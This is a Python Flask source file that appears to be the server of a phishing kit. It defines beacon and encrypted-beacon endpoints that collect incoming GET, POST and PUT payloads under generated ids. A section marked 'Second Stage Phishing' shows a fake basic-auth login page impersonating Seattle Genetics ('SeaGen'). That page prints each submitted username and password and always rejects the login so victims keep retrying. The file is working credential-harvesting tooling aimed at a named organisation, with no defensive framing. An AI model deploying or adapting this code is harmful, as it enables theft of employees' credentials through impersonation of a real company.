from flask import (Flask, request, Response, jsonify)
from models.tables import (app)
from helpers.utils import (PayloadProcessor, BeaconRegistrator)
from uuid import uuid4

from functools import wraps



@app.route('/ebeacon')
@app.route('/ebeacon/<hashid>')
def ebeacon_get(hashid=None):
    return BeaconRegistrator().accept_beacon(
                hashid or uuid4().hex[:8] ,
                PayloadProcessor().process_get(request, encrypt=True)
            )

@app.route('/beacon')
@app.route('/beacon/<hashid>')
def beacon_get(hashid=None):
    return BeaconRegistrator().accept_beacon(
                hashid or uuid4().hex[:8] ,
                PayloadProcessor().process_get(request, encrypt=False)
            )

@app.route('/ebeacon', methods=['POST'])
@app.route('/ebeacon/<hashid>', methods=['POST'])
def ebeacon_post(hashid=None):
    return BeaconRegistrator().accept_beacon(
                hashid or uuid4().hex[:8] ,
                PayloadProcessor().process_post(request, encrypt=True)
            )


@app.route('/beacon', methods=['POST'])
@app.route('/beacon/<hashid>', methods=['POST'])
def beacon_post(hashid=None):
    return BeaconRegistrator().accept_beacon(
                hashid or uuid4().hex[:8] ,
                PayloadProcessor().process_post(request, encrypt=False)
            )

@app.route('/ebeacon', methods=['PUT'])
@app.route('/ebeacon/<hashid>', methods=['PUT'])
def ebeacon_put(hashid=None):
    return BeaconRegistrator().accept_beacon(
                hashid or uuid4().hex[:8] ,
                PayloadProcessor().process_put(request, encrypt=True)
            )

@app.route('/beacon', methods=['PUT'])
@app.route('/beacon/<hashid>', methods=['PUT'])
def beacon_put(hashid=None):
    return BeaconRegistrator().accept_beacon(
                hashid or uuid4().hex[:8] ,
                PayloadProcessor().process_put(request, encrypt=False)
            )

####### Second Stage Phishing 

def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    print("Username: {}, Password: {}".format(username, password))
    return False

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your Network Credentials for that URL.\n'
    'You have to login with proper SeaGen credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Seattle Genetics Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route('/signin')
@requires_auth
def hook_page():
    return 'OK'


if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0")
